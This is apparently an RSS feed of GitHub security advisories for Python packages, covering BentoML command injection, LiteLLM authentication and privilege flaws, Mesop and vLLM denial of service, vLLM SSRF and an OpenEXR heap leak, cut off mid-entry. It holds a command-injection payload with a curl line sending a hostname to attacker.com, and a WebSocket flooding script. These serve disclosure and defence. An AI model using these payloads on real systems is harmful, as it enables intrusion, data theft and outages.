<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-04-03T22:05:05.271Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[bentoml] BentoML: Command Injection in cloud deployment setup script]]></title>
        <id>https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</id>
        <link href="https://github.com/advisories/GHSA-fgv4-6jr3-jgfw"/>
        <updated>2026-04-03T22:03:24.000Z</updated>
        <content type="html"><![CDATA[<p>Commit ce53491 (March 24) fixed command injection via <code>system_packages</code> in Dockerfile templates and <code>images.py</code> by adding <code>shlex.quote</code>. However, the cloud deployment path in <code>src/bentoml/_internal/cloud/deployment.py</code> was not included in the fix. Line 1648 interpolates <code>system_packages</code> directly into a shell command using an f-string without any quoting.</p>
<p>The generated script is uploaded to BentoCloud as <code>setup.sh</code> and executed on the cloud build infrastructure during deployment, making this a remote code execution on the CI/CD tier.</p>
<h2 id="details">Details</h2>
<p><strong>Fixed paths (commit ce53491):</strong></p>
<ul>
<li><code>src/_bentoml_sdk/images.py:88</code> - added <code>shlex.quote(package)</code></li>
<li><code>src/bentoml/_internal/bento/build_config.py:505</code> - added <code>bash_quote</code> Jinja2 filter</li>
<li>Jinja2 templates: <code>base_debian.j2</code>, <code>base_alpine.j2</code>, etc.</li>
</ul>
<p><strong>Unfixed path:</strong></p>
<p><code>src/bentoml/_internal/cloud/deployment.py</code>, line 1648:</p>
<pre><code>def _build_setup_script(bento_dir: str, image: Image | None) -&gt; bytes:
    content = b""
    config = BentoBuildConfig.from_bento_dir(bento_dir)
    if config.docker.system_packages:
        content += f"apt-get update &amp;&amp; apt-get install -y {' '.join(config.docker.system_packages)} || exit 1\n".encode()
</code></pre>
<p><code>system_packages</code> values from <code>bentofile.yaml</code> are joined with spaces and interpolated directly into the <code>apt-get install</code> command. No <code>shlex.quote</code>.</p>
<p><strong>Remote execution confirmed:</strong></p>
<ul>
<li>Line 905: <code>setup_script = _build_setup_script(bento_dir, svc.image)</code> in <code>_init_deployment_files</code></li>
<li>Line 908: <code>upload_files.append(("setup.sh", setup_script))</code> uploads to BentoCloud</li>
<li>Line 914: <code>self.upload_files(upload_files, ...)</code> sends to the remote deployment</li>
<li>The script runs on the cloud build infrastructure during container setup</li>
</ul>
<p><strong>Second caller at line 1068:</strong> <code>_build_setup_script</code> is also called during <code>Deployment.watch()</code> for dev mode hot-reload deployments.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>bentofile.yaml:</p>
<pre><code>service: "service:svc"
docker:
  system_packages:
    - "curl"
    - "jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}#"
</code></pre>
<p>Generated setup.sh:</p>
<pre><code>apt-get update &amp;&amp; apt-get install -y curl jq;curl${IFS}http://attacker.com/rce?d=$(cat${IFS}/etc/hostname)${IFS}# || exit 1
</code></pre>
<p>The semicolon terminates the <code>apt-get</code> command. <code>${IFS}</code> is used for spaces (works in bash, avoids YAML parsing issues). The <code>#</code> comments out the trailing <code>|| exit 1</code>. The injected <code>curl</code> exfiltrates the hostname of the build infrastructure to the attacker.</p>
<h2 id="impact">Impact</h2>
<p>A malicious <code>bentofile.yaml</code> achieves remote code execution on BentoCloud's build infrastructure (or enterprise Yatai/Kubernetes build nodes) during deployment. Attack scenarios:</p>
<ol>
<li><strong>Supply chain:</strong> A shared Bento from a public model hub contains a poisoned <code>bentofile.yaml</code>. When deployed to BentoCloud, the injected command runs on the build infrastructure.</li>
<li><strong>Insider threat:</strong> A data scientist with deploy permissions injects commands into <code>system_packages</code> to exfiltrate secrets from the build environment (cloud credentials, API keys, other tenants' data).</li>
<li><strong>CI/CD compromise:</strong> The build infrastructure typically has access to container registries, artifact storage, and deployment APIs, making this a pivot point for broader infrastructure compromise.</li>
</ol>
<h2 id="local-reproduction-steps">Local Reproduction Steps</h2>
<p>Tested and confirmed on Ubuntu with BentoML source at commit 0772581.</p>
<p>Step 1: Create a directory with a malicious bentofile.yaml:</p>
<pre><code>mkdir /tmp/bento-pwn
cat &gt; /tmp/bento-pwn/bentofile.yaml &lt;&lt; 'EOF'
service: "service:svc"
docker:
  system_packages:
    - "curl"
    - "jq; touch /tmp/PWNED_BY_INJECTION #"
EOF
</code></pre>
<p>Step 2: Generate the setup script using the vulnerable code path (extracted from deployment.py:1648):</p>
<pre><code>python3 -c "
import yaml
with open('/tmp/bento-pwn/bentofile.yaml') as f:
    config = yaml.safe_load(f)
pkgs = config['docker']['system_packages']
script = f\"apt-get update &amp;&amp; apt-get install -y {' '.join(pkgs)} || exit 1\n\"
print('Generated setup.sh:')
print(script)
with open('/tmp/bento-pwn/setup.sh', 'w') as f:
    f.write(script)
"
</code></pre>
<p>Step 3: Execute and verify:</p>
<pre><code>rm -f /tmp/PWNED_BY_INJECTION
bash /tmp/bento-pwn/setup.sh
ls -la /tmp/PWNED_BY_INJECTION
</code></pre>
<p>Result: <code>/tmp/PWNED_BY_INJECTION</code> is created, confirming the injected <code>touch</code> command executed. The semicolon broke out of <code>apt-get install</code>, the injected command ran, and <code>#</code> commented out the error handler.</p>
<p>Generated setup.sh content:</p>
<pre><code>apt-get update &amp;&amp; apt-get install -y curl jq; touch /tmp/PWNED_BY_INJECTION # || exit 1
</code></pre>
<p>For comparison, the fixed version (with shlex.quote) would generate:</p>
<pre><code>apt-get update &amp;&amp; apt-get install -y curl 'jq; touch /tmp/PWNED_BY_INJECTION #' || exit 1
</code></pre>
<p>The single quotes from shlex.quote neutralize the semicolon and hash, treating the entire string as a literal package name argument to apt-get.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Apply <code>shlex.quote</code> to each package name, matching the fix in <code>images.py</code>:</p>
<pre><code>if config.docker.system_packages:
    quoted = ' '.join(shlex.quote(p) for p in config.docker.system_packages)
    content += f"apt-get update &amp;&amp; apt-get install -y {quoted} || exit 1\n".encode()
</code></pre>
<p>— Koda Reef</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw">https://github.com/bentoml/BentoML/security/advisories/GHSA-fgv4-6jr3-jgfw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33744">https://nvd.nist.gov/vuln/detail/CVE-2026-33744</a></li>
<li><a href="https://github.com/advisories/GHSA-fgv4-6jr3-jgfw">https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fgv4-6jr3-jgfw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T22:03:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: Authentication bypass via OIDC userinfo cache key collision]]></title>
        <id>https://github.com/advisories/GHSA-jjhc-v7c2-5hh6</id>
        <link href="https://github.com/advisories/GHSA-jjhc-v7c2-5hh6"/>
        <updated>2026-04-03T21:59:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When JWT authentication is enabled (<code>enable_jwt_auth: true</code>), the OIDC userinfo cache uses <code>token[:20]</code> as the cache key. JWT headers produced by the same signing algorithm generate identical first 20 characters.</p>
<p>This configuration option is not enabled by default. <strong>Most instances are not affected.</strong></p>
<p>An unauthenticated attacker can craft a token whose first 20 characters match a legitimate user's cached token. On cache hit, the attacker inherits the legitimate user's identity and permissions. This affects deployments with JWT/OIDC authentication enabled.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in v1.83.0. The cache key now uses the full hash of the JWT token.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable OIDC userinfo caching by setting the cache TTL to 0, or disable JWT authentication entirely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-jjhc-v7c2-5hh6">https://github.com/BerriAI/litellm/security/advisories/GHSA-jjhc-v7c2-5hh6</a></li>
<li><a href="https://github.com/advisories/GHSA-jjhc-v7c2-5hh6">https://github.com/advisories/GHSA-jjhc-v7c2-5hh6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjhc-v7c2-5hh6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-03T21:59:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM: Privilege escalation via unrestricted proxy configuration endpoint]]></title>
        <id>https://github.com/advisories/GHSA-53mr-6c8q-9789</id>
        <link href="https://github.com/advisories/GHSA-53mr-6c8q-9789"/>
        <updated>2026-04-03T21:59:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>/config/update endpoint</code> does not enforce admin role authorization. A user who is already authenticated into the platform can then use this endpoint to do the following:</p>
<ul>
<li>Modify proxy configuration and environment variables</li>
<li>Register custom pass-through endpoint handlers pointing to attacker-controlled Python code, achieving remote code execution</li>
<li>Read arbitrary server files by setting UI_LOGO_PATH and fetching via /get_image</li>
<li>Take over other priveleged accounts by overwriting UI_USERNAME and UI_PASSWORD environment variables</li>
</ul>
<h3 id="patches">Patches</h3>
<p>Fixed in v1.83.0. The endpoint now requires <code>proxy_admin</code> role.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Restrict API key distribution. There is no configuration-level workaround.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-53mr-6c8q-9789">https://github.com/BerriAI/litellm/security/advisories/GHSA-53mr-6c8q-9789</a></li>
<li><a href="https://github.com/advisories/GHSA-53mr-6c8q-9789">https://github.com/advisories/GHSA-53mr-6c8q-9789</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-53mr-6c8q-9789</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:59:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mesop] Mesop: Unbounded Thread Creation in WebSocket Handler Leads to Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-3jr7-6hqp-x679</id>
        <link href="https://github.com/advisories/GHSA-3jr7-6hqp-x679"/>
        <updated>2026-04-03T21:54:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An uncontrolled resource consumption vulnerability exists in the WebSocket implementation of the Mesop framework. An unauthenticated attacker can send a rapid succession of WebSocket messages, forcing the server to spawn an unbounded number of operating system threads. This leads to thread exhaustion and Out of Memory (OOM) errors, causing a complete Denial of Service (DoS) for any application built on the framework.</p>
<h3 id="details">Details</h3>
<p>The vulnerability stems from an architectural flaw in how incoming WebSocket messages are processed. In the <code>mesop/server/server.py</code> file, the <code>handle_websocket</code> function listens for incoming messages and immediately spawns a new <code>threading.Thread</code> for every successfully parsed <code>ui_request</code>.</p>
<p>There is no thread pool, message queue, or rate-limiting mechanism implemented to restrict the number of concurrent threads spawned per connection. </p>
<p><em>Vulnerable code snippet in <code>mesop/server/server.py</code>:</em></p>
<pre><code class="language-python">while True:
    message = ws.receive()
    if not message:
        continue
    # ... message parsing logic ...

    # VULNERABILITY: Spawning a new thread for every single message without limits
    thread = threading.Thread(
        target=copy_current_request_context(ws_generate_data),
        args=(ws, ui_request),
        daemon=True,
    )
    thread.start()
</code></pre>
<h3 id="poc">PoC</h3>
<p>To reproduce this vulnerability, you only need a running instance of a Mesop application and a basic Python script to flood the WebSocket endpoint.</p>
<p>Prerequisites:</p>
<p>Python environment with the <code>websocket-client library</code> installed (<code>pip install websocket-client</code>).</p>
<p>A target Mesop application running locally (e.g., <code>http://localhost:8080</code>).</p>
<p>Steps to reproduce:</p>
<p>Start the target Mesop application.</p>
<p>Save the following script as <code>exploit_dos.py</code>.</p>
<p>Run the script: python <code>exploit_dos.py</code>. Watch the server's resource monitor; memory and thread counts will spike rapidly until the process crashes.</p>
<pre><code>import websocket
import base64

# Replace with the target Mesop application's WebSocket URL
TARGET_WS_URL = "ws://localhost:8080/__ui__"

# A minimal valid base64 payload to bypass `base64.urlsafe_b64decode` 
# and Protobuf `ParseFromString` without throwing a parsing exception.
EMPTY_UI_REQUEST_B64 = base64.urlsafe_b64encode(b'').decode('utf-8')

def flood_server():
    ws = websocket.WebSocket()
    try:
        ws.connect(TARGET_WS_URL)
        print("[+] Connection established. Initiating thread exhaustion attack...")
        
        # Rapidly send 50,000 messages to force the server to spawn 50,000 threads
        for i in range(50000):
            ws.send(EMPTY_UI_REQUEST_B64)
            
        print("[+] Payloads sent. The server should be unresponsive or crashed by now.")
        ws.close()
    except Exception as e:
        print(f"[-] Connection closed or server crashed: {e}")

if __name__ == "__main__":
    flood_server()
</code></pre>
<h3 id="impact">Impact</h3>
<p>Vulnerability Type: Denial of Service (DoS) / CWE-400: Uncontrolled Resource Consumption.</p>
<p>Impacted Parties: Any developer or organization deploying a Mesop-based application to a publicly accessible network.</p>
<p>Severity: High. An unauthenticated external attacker can completely crash the application within seconds using minimal bandwidth from a single machine, rendering the service unavailable to all legitimate users.</p>
<h3 id="mitigation-recommended-fixes">Mitigation (Recommended Fixes):</h3>
<p>Use a bounded thread pool (e.g., ThreadPoolExecutor with max_workers)
Introduce per-connection rate limiting
Implement a message queue with backpressure
Consider migrating to an async event loop model instead of spawning OS threads</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/mesop-dev/mesop/security/advisories/GHSA-3jr7-6hqp-x679">https://github.com/mesop-dev/mesop/security/advisories/GHSA-3jr7-6hqp-x679</a></li>
<li><a href="https://github.com/mesop-dev/mesop/commit/760a2079b5c609038c826d24dfbcf9b0be98d987">https://github.com/mesop-dev/mesop/commit/760a2079b5c609038c826d24dfbcf9b0be98d987</a></li>
<li><a href="https://github.com/mesop-dev/mesop/releases/tag/v1.2.5">https://github.com/mesop-dev/mesop/releases/tag/v1.2.5</a></li>
<li><a href="https://github.com/advisories/GHSA-3jr7-6hqp-x679">https://github.com/advisories/GHSA-3jr7-6hqp-x679</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3jr7-6hqp-x679</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-03T21:54:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Denial of Service via Unbounded Frame Count in video/jpeg Base64 Processing]]></title>
        <id>https://github.com/advisories/GHSA-pq5c-rjhq-qp7p</id>
        <link href="https://github.com/advisories/GHSA-pq5c-rjhq-qp7p"/>
        <updated>2026-04-03T21:51:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>VideoMediaIO.load_base64()</code> method at <code>vllm/multimodal/media/video.py:51-62</code> splits <code>video/jpeg</code> data URLs by comma to extract individual JPEG frames, but does not enforce a frame count limit. The <code>num_frames</code> parameter (default: 32), which is enforced by the <code>load_bytes()</code> code path at line 47-48, is completely bypassed in the <code>video/jpeg</code> base64 path. An attacker can send a single API request containing thousands of comma-separated base64-encoded JPEG frames, causing the server to decode all frames into memory and crash with OOM.</p>
<h2 id="details">Details</h2>
<h3 id="vulnerable-code">Vulnerable code</h3>
<pre><code class="language-python"># video.py:51-62
def load_base64(self, media_type: str, data: str) -&gt; tuple[npt.NDArray, dict[str, Any]]:
    if media_type.lower() == "video/jpeg":
        load_frame = partial(self.image_io.load_base64, "image/jpeg")
        return np.stack(
            [np.asarray(load_frame(frame_data)) for frame_data in data.split(",")]
            #                                                       ^^^^^^^^^^
            # Unbounded split — no frame count limit
        ), {}
    return self.load_bytes(base64.b64decode(data))
</code></pre>
<p>The <code>load_bytes()</code> path (line 47-48) properly delegates to a video loader that respects <code>self.num_frames</code> (default 32). The <code>load_base64("video/jpeg", ...)</code> path bypasses this limit entirely — <code>data.split(",")</code> produces an unbounded list and every frame is decoded into a numpy array.</p>
<h3 id="videojpeg-is-part-of-vllms-public-api">video/jpeg is part of vLLM's public API</h3>
<p><code>video/jpeg</code> is a vLLM-specific MIME type, not IANA-registered. However it is part of the public API surface:</p>
<ul>
<li><code>encode_video_url()</code> at <code>vllm/multimodal/utils.py:96-108</code> generates <code>data:video/jpeg;base64,...</code> URLs</li>
<li>Official test suites at <code>tests/entrypoints/openai/test_video.py:62</code> and <code>tests/entrypoints/test_chat_utils.py:153</code> both use this format</li>
</ul>
<h3 id="memory-amplification">Memory amplification</h3>
<p>Each JPEG frame decodes to a full numpy array. For 640x480 RGB images, each frame is <del>921 KB decoded. 5000 frames = ~4.6 GB. <code>np.stack()</code> then creates an additional copy. The compressed JPEG payload is small (</del>100 KB for 5000 frames) but decompresses to gigabytes.</p>
<h3 id="data-flow">Data flow</h3>
<pre><code>POST /v1/chat/completions
  → chat_utils.py:1434   video_url type → mm_parser.parse_video()
  → chat_utils.py:872    parse_video() → self._connector.fetch_video()
  → connector.py:295     fetch_video() → load_from_url(url, self.video_io)
  → connector.py:91      _load_data_url(): url_spec.path.split(",", 1)
                          → media_type = "video/jpeg"
                          → data = "&lt;frame1&gt;,&lt;frame2&gt;,...,&lt;frame10000&gt;"
  → connector.py:100     media_io.load_base64("video/jpeg", data)
  → video.py:54          data.split(",")  ← UNBOUNDED
  → video.py:55-57       all frames decoded into numpy arrays
  → video.py:56          np.stack([...])  ← massive combined array → OOM
</code></pre>
<p><code>connector.py:91</code> uses <code>split(",", 1)</code> which splits on only the first comma. All remaining commas stay in <code>data</code> and are later split by <code>video.py:54</code>.</p>
<h3 id="comparison-with-existing-protections">Comparison with existing protections</h3>
<table>
<thead>
<tr>
<th>Code Path</th>
<th>Frame Limit</th>
<th>File</th>
</tr>
</thead>
<tbody><tr>
<td><code>load_bytes()</code> (binary video)</td>
<td>Yes — <code>num_frames</code> (default 32)</td>
<td>video.py:46-49</td>
</tr>
<tr>
<td><code>load_base64("video/jpeg", ...)</code></td>
<td>No — unlimited <code>data.split(",")</code></td>
<td>video.py:51-62</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-pq5c-rjhq-qp7p">https://github.com/vllm-project/vllm/security/advisories/GHSA-pq5c-rjhq-qp7p</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/38636">https://github.com/vllm-project/vllm/pull/38636</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/58ee61422169ce17e08248f8efa1e9df434fe395">https://github.com/vllm-project/vllm/commit/58ee61422169ce17e08248f8efa1e9df434fe395</a></li>
<li><a href="https://github.com/advisories/GHSA-pq5c-rjhq-qp7p">https://github.com/advisories/GHSA-pq5c-rjhq-qp7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pq5c-rjhq-qp7p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T21:51:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Server-Side Request Forgery (SSRF) in `download_bytes_from_url `]]></title>
        <id>https://github.com/advisories/GHSA-pf3h-qjgv-vcpr</id>
        <link href="https://github.com/advisories/GHSA-pf3h-qjgv-vcpr"/>
        <updated>2026-04-03T21:51:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A Server Side Request Forgery (SSRF) vulnerability in <code>download_bytes_from_url</code> allows any actor who can control batch input JSON to make the vLLM batch runner issue arbitrary HTTP/HTTPS requests from the server, without any URL validation or domain restrictions.</p>
<p>This can be used to target internal services (e.g. cloud metadata endpoints or internal HTTP APIs) reachable from the vLLM host.</p>
<hr>
<h3 id="details">Details</h3>
<h4 id="vulnerable-component">Vulnerable component</h4>
<p>The vulnerable logic is in the batch runner entrypoint <code>vllm/entrypoints/openai/run_batch.py</code>, function <code>download_bytes_from_url</code>:</p>
<pre><code># run_batch.py Lines 442-482
async def download_bytes_from_url(url: str) -&gt; bytes:
    """
    Download data from a URL or decode from a data URL.

    Args:
        url: Either an HTTP/HTTPS URL or a data URL (data:...;base64,...)

    Returns:
        Data as bytes
    """
    parsed = urlparse(url)

    # Handle data URLs (base64 encoded)
    if parsed.scheme == "data":
        # Format: data:...;base64,&lt;base64_data&gt;
        if "," in url:
            header, data = url.split(",", 1)
            if "base64" in header:
                return base64.b64decode(data)
            else:
                raise ValueError(f"Unsupported data URL encoding: {header}")
        else:
            raise ValueError(f"Invalid data URL format: {url}")

    # Handle HTTP/HTTPS URLs
    elif parsed.scheme in ("http", "https"):
        async with (
            aiohttp.ClientSession() as session,
            session.get(url) as resp,
        ):
            if resp.status != 200:
                raise Exception(
                    f"Failed to download data from URL: {url}. Status: {resp.status}"
                )
            return await resp.read()

    else:
        raise ValueError(
            f"Unsupported URL scheme: {parsed.scheme}. "
            "Supported schemes: http, https, data"
        )
</code></pre>
<p>Key properties:</p>
<ul>
<li>The function only parses the URL to dispatch on the scheme (<code>data</code>, <code>http</code>, <code>https</code>).</li>
<li>For <code>http</code> / <code>https</code>, it directly calls <code>session.get(url)</code> on the provided string.</li>
<li>There is no validation of:<ul>
<li>hostname or IP address,</li>
<li>whether the target is internal or external,</li>
<li>port number,</li>
<li>path, query, or redirect target.</li>
</ul>
</li>
<li>This is in contrast to the multimodal media path (<code>MediaConnector</code>), which implements an explicit domain allowlist. <code>download_bytes_from_url</code> does not reuse that protection.</li>
</ul>
<h4 id="url-controllability">URL controllability</h4>
<p>The <code>url</code> argument is fully controlled by batch input JSON via the <code>file_url</code> field of <code>BatchTranscriptionRequest</code> / <code>BatchTranslationRequest</code>.</p>
<ol>
<li>Batch request body type:</li>
</ol>
<pre><code># run_batch.py Line 67-80
class BatchTranscriptionRequest(TranscriptionRequest):
    """
    Batch transcription request that uses file_url instead of file.

    This class extends TranscriptionRequest but replaces the file field
    with file_url to support batch processing from audio files written in JSON format.
    """

    file_url: str = Field(
        ...,
        description=(
            "Either a URL of the audio or a data URL with base64 encoded audio data. "
        ),
    )
</code></pre>
<pre><code># run_batch.py Line 98-111
class BatchTranslationRequest(TranslationRequest):
    """
    Batch translation request that uses file_url instead of file.

    This class extends TranslationRequest but replaces the file field
    with file_url to support batch processing from audio files written in JSON format.
    """

    file_url: str = Field(
        ...,
        description=(
            "Either a URL of the audio or a data URL with base64 encoded audio data. "
        ),
    )
</code></pre>
<p>There is no restriction on the domain, IP, or port of <code>file_url</code> in these models.</p>
<ol>
<li>Batch input is parsed directly from the batch file:</li>
</ol>
<pre><code># run_batch.py Line 139-179
class BatchRequestInput(OpenAIBaseModel):
    ...
    url: str
    body: BatchRequestInputBody
    @field_validator("body", mode="plain")
    @classmethod
    def check_type_for_url(cls, value: Any, info: ValidationInfo):
        url: str = info.data["url"]
        ...
        if url == "/v1/audio/transcriptions":
            return BatchTranscriptionRequest.model_validate(value)
        if url == "/v1/audio/translations":
            return BatchTranslationRequest.model_validate(value)
</code></pre>
<pre><code># run_batch.py Line 770-781
   logger.info("Reading batch from %s...", args.input_file)

    # Submit all requests in the file to the engine "concurrently".
    response_futures: list[Awaitable[BatchRequestOutput]] = []
    for request_json in (await read_file(args.input_file)).strip().split("\n"):
        # Skip empty lines.
        request_json = request_json.strip()
        if not request_json:
            continue

        request = BatchRequestInput.model_validate_json(request_json)
</code></pre>
<p>The batch runner reads each line of the input file (<code>args.input_file</code>), parses it as JSON, and constructs a <code>BatchTranscriptionRequest</code> / <code>BatchTranslationRequest</code>. Whatever <code>file_url</code> appears in that JSON line becomes <code>batch_request_body.file_url</code>.</p>
<ol>
<li><code>file_url</code> is passed directly into <code>download_bytes_from_url</code>:</li>
</ol>
<pre><code># run_batch.py Line 610-623
def wrapper(handler_fn: Callable):
        async def transcription_wrapper(
            batch_request_body: (BatchTranscriptionRequest | BatchTranslationRequest),
        ) -&gt; (
            TranscriptionResponse
            | TranscriptionResponseVerbose
            | TranslationResponse
            | TranslationResponseVerbose
            | ErrorResponse
        ):
            try:
                # Download data from URL
                audio_data = await download_bytes_from_url(batch_request_body.file_url)
</code></pre>
<p>So the data flow is:</p>
<ol>
<li>Attacker supplies JSON line in the batch input file with arbitrary <code>body.file_url</code>.</li>
<li><code>BatchRequestInput</code> / <code>BatchTranscriptionRequest</code> / <code>BatchTranslationRequest</code> parse that JSON and store <code>file_url</code> verbatim.</li>
<li><code>make_transcription_wrapper</code> calls <code>download_bytes_from_url(batch_request_body.file_url)</code>.</li>
<li><code>download_bytes_from_url</code>’s HTTP/HTTPS branch issues <code>aiohttp.ClientSession().get(url)</code> to that attacker-controlled URL with no further validation.</li>
</ol>
<p>This is a classic SSRF pattern: a server-side component makes arbitrary HTTP requests to a URL string taken from untrusted input.</p>
<h4 id="comparison-with-safer-code">Comparison with safer code</h4>
<p>The project already contains a safer URL-handling path for multimodal media in <code>vllm/multimodal/media/connector.py</code>, which demonstrates the intent to mitigate SSRF via domain allowlists and URL normalization:</p>
<pre><code># connector.py Lines 169-189
 def load_from_url(
        self,
        url: str,
        media_io: MediaIO[_M],
        *,
        fetch_timeout: int | None = None,
    ) -&gt; _M:  # type: ignore[type-var]
        url_spec = parse_url(url)

        if url_spec.scheme and url_spec.scheme.startswith("http"):
            self._assert_url_in_allowed_media_domains(url_spec)

            connection = self.connection
            data = connection.get_bytes(
                url_spec.url,
                timeout=fetch_timeout,
                allow_redirects=envs.VLLM_MEDIA_URL_ALLOW_REDIRECTS,
            )

            return media_io.load_bytes(data)
</code></pre>
<p>and:</p>
<pre><code># connector.py Lines 158-167
  def _assert_url_in_allowed_media_domains(self, url_spec: Url) -&gt; None:
        if (
            self.allowed_media_domains
            and url_spec.hostname not in self.allowed_media_domains
        ):
            raise ValueError(
                f"The URL must be from one of the allowed domains: "
                f"{self.allowed_media_domains}. Input URL domain: "
                f"{url_spec.hostname}"
            )
</code></pre>
<p><code>download_bytes_from_url</code> does not reuse this allowlist or any equivalent validation, even though it also fetches user-provided URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-pf3h-qjgv-vcpr">https://github.com/vllm-project/vllm/security/advisories/GHSA-pf3h-qjgv-vcpr</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/38482">https://github.com/vllm-project/vllm/pull/38482</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/57861ae48d3493fa48b4d7d830b7ec9f995783e7">https://github.com/vllm-project/vllm/commit/57861ae48d3493fa48b4d7d830b7ec9f995783e7</a></li>
<li><a href="https://github.com/advisories/GHSA-pf3h-qjgv-vcpr">https://github.com/advisories/GHSA-pf3h-qjgv-vcpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf3h-qjgv-vcpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-03T21:51:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openexr] OpenEXR: Heap information disclosure in PXR24 decompression via unchecked decompressed size (undo_pxr24_impl)]]></title>
        <id>https://github.com/advisories/GHSA-vc68-257w-m432</id>
        <link href="https://github.com/advisories/GHSA-vc68-257w-m432"/>
        <updated>2026-04-03T21:50:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The PXR24 decompression function undo_pxr24_impl in OpenEXR (internal_pxr24.c) ignores the actual decompressed size (outSize) returned by exr_uncompress_buffer() and instead reads from the scratch buffer based solely on the expected size (uncompressed_size) derived from the header metadata.</p>
<p>Additionally, exr_uncompress_buffer() (compression.c:202) treats LIBDEFLATE_SHORT_OUTPUT (where the compressed stream decompresses to fewer bytes than expected) as a successful result rather than an error.</p>
<p>When these two issues are combined, an attacker can craft a PXR24 EXR file containing a valid but truncated zlib stream. As a result, the decoder reads uninitialized heap memory and incorporates it into the output pixel data.</p>
<h3 id="details">Details</h3>
<p>This issue occurs due to the combination of two flaws.</p>
<ol>
<li>compression.c:202–205 — LIBDEFLATE_SHORT_OUTPUT treated as success</li>
</ol>
<pre><code>else if (res == LIBDEFLATE_SHORT_OUTPUT)
{
    /* TODO: is this an error? */
    return EXR_ERR_SUCCESS;
}
</code></pre>
<p>libdeflate_zlib_decompress_ex() returns LIBDEFLATE_SHORT_OUTPUT when the compressed stream is successfully decompressed but the resulting output size is smaller than the provided output buffer size. In this case, the actual number of decompressed bytes is written to actual_out. However, the function does not treat this condition as an error and instead returns success.</p>
<ol start="2">
<li>internal_pxr24.c:279–287 — outSize return value ignored</li>
</ol>
<pre><code>rstat = exr_uncompress_buffer(
    decode-&gt;context, compressed_data, comp_buf_size,
    scratch_data, scratch_size, &amp;outSize);   // outSize = actual bytes written

if (rstat != EXR_ERR_SUCCESS) return rstat;

// outSize is never referenced afterwards.
// The loop below reads the entire scratch_data buffer based on
// uncompressed_size (the header-derived expected size).
for (int y = 0; y &lt; decode-&gt;chunk.height; ++y) { ... }
</code></pre>
